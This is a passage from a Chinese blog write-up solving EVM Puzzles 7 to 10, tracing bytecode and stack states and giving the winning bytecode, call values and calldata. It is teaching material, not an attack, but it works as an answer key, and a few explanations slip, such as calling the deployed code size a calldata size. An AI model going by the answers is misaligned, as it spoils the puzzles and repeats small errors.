class="hljs-attribute">01</span>      <span class="hljs-number">6000</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">03</span>      <span class="hljs-number">80</span>        DUP<span class="hljs-number">1</span><br><span class="hljs-attribute">04</span>      <span class="hljs-number">37</span>        CALLDATACOPY<br><span class="hljs-attribute">05</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-attribute">06</span>      <span class="hljs-number">6000</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">08</span>      <span class="hljs-number">6000</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">0A</span>      F<span class="hljs-number">0</span>        CREATE<br><span class="hljs-attribute">0B</span>      <span class="hljs-number">3</span>B        EXTCODESIZE<br><span class="hljs-attribute">0C</span>      <span class="hljs-number">6001</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">01</span><br><span class="hljs-attribute">0E</span>      <span class="hljs-number">14</span>        EQ<br><span class="hljs-attribute">0F</span>      <span class="hljs-number">6013</span>      PUSH<span class="hljs-number">1</span> <span class="hljs-number">13</span><br><span class="hljs-attribute">11</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-attribute">12</span>      FD        REVERT<br><span class="hljs-attribute">13</span>      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-attribute">14</span>      <span class="hljs-number">00</span>        STOP<br><br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><strong>PUSH1 00</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><strong>DUP1</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#37"><strong>CALLDATACOPY</strong></a> <strong>destOffset offset size</strong></p><p>从第 offset 的位置复制长度为 size 的 calldata，并从 destOffset 写进 memory。</p><p>在此过程将消耗堆栈上的所有三个顶部元素</p><p>运行后的结果和之前没有变化</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><p><strong>PUSH1 00</strong></p><p><strong>PUSH1 00</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#f0"><strong>CREATE</strong></a> <strong>value offset size</strong></p><p>建立（部署）新合约，会开启子 context 并执行初始化 code，执行完后会继续 context。</p><p>如果部署成功，新地址的 code 会是执行初始化 code 的回传结果。</p><p>合约地址的计算公式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">address</span> = keccak256(rlp(<span class="hljs-selector-attr">[sender_address,sender_nonce]</span>))<span class="hljs-selector-attr">[12:]</span><br></code></pre></td></tr></table></figure><p>value</p><p>发送给合约的 value。</p><p>offset｜size</p><p>将 memory 里第 offset 长度为 size 的资料作为初始化 code 赋给 EVM 执行。</p><p>因此运行结果</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[address_deployed<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#3b"><strong>EXTCODESIZE</strong></a> 会将堆栈顶部的地址的代码大小返回</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[address_code_size<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><strong>PUSH1</strong> <strong>01</strong></p><p><strong>EQ</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[1 address_code_size<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>]<br></code></pre></td></tr></table></figure><p>然后比较01和address_code_size是否相等</p><p>若相等则可以成功跳转至第13条命令，通过挑战</p><p>因此现在的目标是使输入的calldata的calldatasize为1</p><p><a href="https://www.evm.codes/#f3"><strong>RETURN</strong></a> 的作用：从堆栈中弹出 2 个值以将它们用作以下操作的输入</p><ul><li>offset：从哪里开始读取的内存偏移量</li><li>size：要读取和返回的内存大小（以字节为单位）</li></ul><p>因此，无论它在内存中是什么，我们都只想返回 1 条 1 字节的指令。我们的目标是执行<code>RETURN(offset=0, size=1)</code>。</p><p>所以一个简单的智能合约</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // <span class="hljs-number">00</span> 是 STOP <br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // 这将被用作 MSTORE<span class="hljs-number">8</span> 的偏移量，在内存中存储 STOP<br><span class="hljs-attribute">53</span>    MSTORE<span class="hljs-number">8</span>   // 将从偏移量 <span class="hljs-number">0</span> 开始在内存中存储 `<span class="hljs-number">00</span>` 值（来自第一个 PUSH<span class="hljs-number">1</span>）<br><span class="hljs-attribute">6001</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">01</span> // 必须返回 <span class="hljs-number">1</span> 字节<br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // 从 <span class="hljs-number">0</span> 返回这些字节<br><span class="hljs-attribute">F3</span>    RETURN<br></code></pre></td></tr></table></figure><p>翻译为字节码即为 600060005360016000F3</p><h2 id="Puzzle-8"><a href="#Puzzle-8" class="headerlink" title="Puzzle 8"></a>Puzzle 8</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">8</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">03</span>      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">04</span>      <span class="hljs-number">37</span>        CALLDATACOPY<br><span class="hljs-number">05</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">06</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">08</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">0</span>A      F0        CREATE<br><span class="hljs-number">0</span>B      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">0</span>D      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">0</span>E      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">0</span>F      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">10</span>      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">11</span>      <span class="hljs-number">94</span>        SWAP5<br><span class="hljs-number">12</span>      <span class="hljs-number">5</span>A        GAS<br><span class="hljs-number">13</span>      F1        CALL<br><span class="hljs-number">14</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">16</span>      <span class="hljs-number">14</span>        EQ<br><span class="hljs-number">17</span>      <span class="hljs-number">601</span>B      PUSH1 <span class="hljs-number">1</span>B<br><span class="hljs-number">19</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-number">1</span>A      FD        REVERT<br><span class="hljs-number">1</span>B      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">1</span>C      <span class="hljs-number">00</span>        STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>前面都和第七题一样</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">00     <span class="hljs-number"> 36 </span>       CALLDATASIZE<br>01     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>03     <span class="hljs-number"> 80 </span>       DUP1<br>04     <span class="hljs-number"> 37 </span>       CALLDATACOPY<br>05     <span class="hljs-number"> 36 </span>       CALLDATASIZE<br>06     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>08     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>0A      F0        CREATE<br><br>[address_deployed<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p>接下来的几条指令</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tap">0B     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>0D     <span class="hljs-number"> 80 </span>       DUP1<br>0E     <span class="hljs-number"> 80 </span>       DUP1<br>0F     <span class="hljs-number"> 80 </span>       DUP1<br>10     <span class="hljs-number"> 80 </span>       DUP1<br><br>[0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 address_deployed<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#94"><strong>SWAP5</strong></a> 用于交换第 1 个和第 6 个堆栈项。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[address_deployed<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?fork=grayGlacier"><strong>GAS</strong></a> 会返回仍然可用的总气体量</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[gas address_deployed<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p>以上基本是为 <a href="https://www.evm.codes/#f1?fork=grayGlacier"><strong>CALL</strong></a> 做准备，如果调用失败，则操作码将 0 压入堆栈，否则为 1。</p><p><strong>注意：</strong>如果被调用的账户没有代码，它会返回成功为<code>true</code>。</p><p>堆栈参数依次为</p><ol><li><code>gas</code>：要发送到子上下文以执行的 gas 量。</li><li><code>address</code>：要执行的上下文的帐户。</li><li><code>value</code>：wei 中的值发送到该地址</li><li><code>argsOffset</code>：内存中的字节偏移量，以字节数表示</li><li><code>argsSize</code>：使用先前指定的偏移量从内存中复制的字节大小</li><li><code>retOffset</code>：内存中的字节偏移量（以字节为单位），用于存储子上下文的返回数据。</li><li><code>retSize</code>：要复制的字节大小（返回数据的大小）。</li></ol><p>而后续需要使 <strong>CALL</strong> 结果等于 00</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">14 </span>     <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-symbol">16 </span>     <span class="hljs-number">14</span>        EQ<br><span class="hljs-symbol">17 </span>     <span class="hljs-number">601</span>B      PUSH1 <span class="hljs-number">1</span>B<br><span class="hljs-symbol">19 </span>     <span class="hljs-number">57</span>        JUMPI<br></code></pre></td></tr></table></figure><p>因此我们需要使合约调用失败，即 <strong>REVERT</strong></p><p>可以再次构造一个 REVERT 的合约</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">60FD</span>  PUSH<span class="hljs-number">1</span>  FD // FD 是 REVERT <br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // 这将被用作 MSTORE<span class="hljs-number">8</span> 的偏移量，在内存中存储 REVERT<br><span class="hljs-attribute">53</span>    MSTORE<span class="hljs-number">8</span>   // 将从偏移量 <span class="hljs-number">0</span> 开始在内存中存储 `FD` 值（来自第一个 PUSH<span class="hljs-number">1</span>）<br><span class="hljs-attribute">6001</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">01</span> // 必须返回 <span class="hljs-number">1</span> 字节<br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // 从 <span class="hljs-number">0</span> 返回这些字节<br><span class="hljs-attribute">F3</span>    RETURN<br></code></pre></td></tr></table></figure><p>即 0x60FD60005360016000F3</p><h2 id="Puzzle-9"><a href="#Puzzle-9" class="headerlink" title="Puzzle 9"></a>Puzzle 9</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">9</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">6003</span>      PUSH1 <span class="hljs-number">03</span><br><span class="hljs-number">03</span>      <span class="hljs-number">10</span>        LT<br><span class="hljs-number">04</span>      <span class="hljs-number">6009</span>      PUSH1 <span class="hljs-number">09</span><br><span class="hljs-number">06</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-number">07</span>      FD        REVERT<br><span class="hljs-number">08</span>      FD        REVERT<br><span class="hljs-number">09</span>      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">0</span>A      <span class="hljs-number">34</span>        CALLVALUE<br><span class="hljs-number">0</span>B      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">0</span>C      <span class="hljs-number">02</span>        MUL<br><span class="hljs-number">0</span>D      <span class="hljs-number">6008</span>      PUSH1 <span class="hljs-number">08</span><br><span class="hljs-number">0</span>F      <span class="hljs-number">14</span>        EQ<br><span class="hljs-number">10</span>      <span class="hljs-number">6014</span>      PUSH1 <span class="hljs-number">14</span><br><span class="hljs-number">12</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-number">13</span>      FD        REVERT<br><span class="hljs-number">14</span>      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">15</span>      <span class="hljs-number">00</span>        STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br>? Enter the calldata: <br><br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><p><strong>PUSH1 03</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[03 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#10"><strong>LT</strong></a> 对前两个堆栈值运行比较，以查看第一个堆栈元素是否小于第二个堆栈元素。如果计算结果为 true，则在堆栈上推送1，否则改为推送0。</p><p>由于这里我们需要得到一个为 1 的结果，所以 calldatasize &gt; 3</p><p>随后运行以下指令</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">09 </span>     <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">0</span>A      <span class="hljs-number">34</span>        CALLVALUE<br><span class="hljs-number">0</span>B      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">0</span>C      <span class="hljs-number">02</span>        MUL<br><span class="hljs-number">0</span>D      <span class="hljs-number">6008</span>      PUSH1 <span class="hljs-number">08</span><br><span class="hljs-number">0</span>F      <span class="hljs-number">14</span>        EQ<br><span class="hljs-symbol">10 </span>     <span class="hljs-number">6014</span>      PUSH1 <span class="hljs-number">14</span><br><span class="hljs-symbol">12 </span>     <span class="hljs-number">57</span>        JUMPI<br></code></pre></td></tr></table></figure><p>也就是说需要满足以下条件</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-built_in">CALLDATASIZE</span> &gt; <span class="hljs-number">3</span><br><span class="hljs-built_in">CALLVALUE</span> * <span class="hljs-built_in">CALLDATASIZE</span> == <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>这里我输入的是</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">? Enter <span class="hljs-keyword">the</span> <span class="hljs-built_in">value</span> <span class="hljs-built_in">to</span> <span class="hljs-built_in">send</span>: <span class="hljs-number">2</span><br>? Enter <span class="hljs-keyword">the</span> calldata: <span class="hljs-number">0x00000001</span><br></code></pre></td></tr></table></figure><h2 id="Puzzle-10"><a href="#Puzzle-10" class="headerlink" title="Puzzle 10"></a>Puzzle 10</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs clean">#############<br># Puzzle <span class="hljs-number">10</span> #<br>#############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">38</span>          CODESIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-number">02</span>      <span class="hljs-number">90</span>          SWAP1<br><span class="hljs-number">03</span>      <span class="hljs-number">11</span>          GT<br><span class="hljs-number">04</span>      <span class="hljs-number">6008</span>        PUSH1 <span class="hljs-number">08</span><br><span class="hljs-number">06</span>      <span class="hljs-number">57</span>          JUMPI<br><span class="hljs-number">07</span>      FD          REVERT<br><span class="hljs-number">08</span>      <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-number">09</span>      <span class="hljs-number">36</span>          CALLDATASIZE<br><span class="hljs-number">0</span>A      <span class="hljs-number">610003</span>      PUSH2 <span class="hljs-number">0003</span><br><span class="hljs-number">0</span>D      <span class="hljs-number">90</span>          SWAP1<br><span class="hljs-number">0</span>E      <span class="hljs-number">06</span>          MOD<br><span class="hljs-number">0</span>F      <span class="hljs-number">15</span>          ISZERO<br><span class="hljs-number">10</span>      <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-number">11</span>      <span class="hljs-number">600</span>A        PUSH1 <span class="hljs-number">0</span>A<br><span class="hljs-number">13</span>      <span class="hljs-number">01</span>          ADD<br><span class="hljs-number">14</span>      <span class="hljs-number">57</span>          JUMPI<br><span class="hljs-number">15</span>      FD          REVERT<br><span class="hljs-number">16</span>      FD          REVERT<br><span class="hljs-number">17</span>      FD          REVERT<br><span class="hljs-number">18</span>      FD          REVERT<br><span class="hljs-number">19</span>      <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-number">1</span>A      <span class="hljs-number">00</span>          STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p><strong>CODESIZE</strong></p><p><strong>CALLVALUE</strong></p><p><strong>SWAP1</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[1b callvalue<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#11"><strong>GT</strong></a> 用来计算大于</p><p>因此需要满足 callvalue &lt; 1b，即十进制中的27</p><p>接下来执行以下指令</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">08 </span>     <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-symbol">09 </span>     <span class="hljs-number">36</span>          CALLDATASIZE<br><span class="hljs-number">0</span>A      <span class="hljs-number">610003</span>      PUSH2 <span class="hljs-number">0003</span><br><span class="hljs-number">0</span>D      <span class="hljs-number">90</span>          SWAP1<br><span class="hljs-number">0</span>E      <span class="hljs-number">06</span>          <span class="hljs-keyword">MOD</span><br><span class="hljs-number">0</span>F      <span class="hljs-number">15</span>          ISZERO<br><span class="hljs-symbol">10 </span>     <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-symbol">11 </span>     <span class="hljs-number">600</span>A        PUSH1 <span class="hljs-number">0</span>A<br><span class="hljs-symbol">13 </span>     <span class="hljs-number">01</span>          ADD<br><span class="hljs-symbol">14 </span>     <span class="hljs-number">57</span>          JUMPI<br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><p><strong>PUSH2 0003</strong></p><p><strong>SWAP1</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[calldatasize<span class="hljs-number"> 3 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#06"><strong>MOD</strong></a> 用于计算第一个堆栈元素和第二个堆栈元素的模，即 a % b</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[calldatasize%3<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#15"><strong>ISZERO</strong></a>，如果堆栈上的最高值为 0 ，则该指令将推送 1 到堆栈上。如果任何其他数字位于堆栈顶部，则将推送 0 到堆栈。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[ISZERO(calldatasize%3)<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><strong>CALLVALUE</strong></p><p><strong>PUSH1 0A</strong></p><p><a href="https://www.evm.codes/?ref=hackernoon.com#01"><strong>ADD</strong></a> 前两个值相加</p><p>然后需要跳转到 0x19 处，也就是说需要满足条件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">calldatasize</span> % <span class="hljs-number">3</span> == <span class="hljs-number">0</span><br><span class="hljs-attribute">0x0a</span> + callvalue = <span class="hljs-number">0</span>x<span class="hljs-number">19</span> // <span class="hljs-number">10</span> + <span class="hljs-number">15</span> = <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>所以我输入</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">? Enter <span class="hljs-keyword">the</span> <span class="hljs-built_in">value</span> <span class="hljs-built_in">to</span> <span class="hljs-built_in">send</span>: <span class="hljs-number">15</span><br>? Enter <span class="hljs-keyword">the</span> calldata: <span class="hljs-number">0x000000</span><br></code></pre></td></tr></table></figure><p>至此，所有 Puzzle 都完成了</p>]]></content>
    
    
      
      
